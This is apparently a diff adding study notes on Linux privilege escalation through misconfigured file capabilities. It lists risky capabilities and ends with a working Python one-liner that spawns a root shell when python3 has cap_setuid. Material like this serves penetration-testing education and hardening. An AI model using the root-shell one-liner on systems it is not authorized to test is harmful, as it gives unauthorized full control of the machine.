@@ -1,0 +1,38 @@
+### What is `getcap`?
+`getcap` is a Linux command used to check **capabilities** assigned to a binary file. Capabilities allow non-root users to execute specific privileged operations without requiring full root access.
+
+### Why Should We Check Capabilities in Privilege Escalation?
+In **privilege escalation (privesc)**, checking capabilities is crucial because misconfigured capabilities can lead to unauthorized privilege escalation. Certain capabilities allow users to perform sensitive operations that could be exploited to gain root access.
+
+### Checking Capabilities
+To list capabilities assigned to files, use:
+```bash
+getcap -r / 2>/dev/null
+```
+This command recursively searches for files with capabilities and suppresses error messages.
+
+### Dangerous Capabilities to Look For:
+1. **`cap_setuid+ep`** → Allows switching to any UID, potentially escalating to root.
+2. **`cap_dac_read_search+ep`** → Allows reading files that the user normally cannot access.
+3. **`cap_sys_admin+ep`** → Grants powerful system control, often leading to root access.
+4. **`cap_net_raw+ep`** → Can allow packet capture and network attacks.
+
+### Example Exploitation:
+If `python3` has `cap_setuid+ep`, check using:
+```bash
+getcap /usr/bin/python3
+```
+Output:
+```
+/usr/bin/python3 = cap_setuid+ep
+```
+
+This allows privilege escalation:
+```bash
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+Now you have a root shell.
+
+### Conclusion:
+Checking capabilities is a crucial step in privilege escalation because improperly set capabilities can allow attackers to escalate privileges without requiring `sudo` or `setuid` binaries.
+
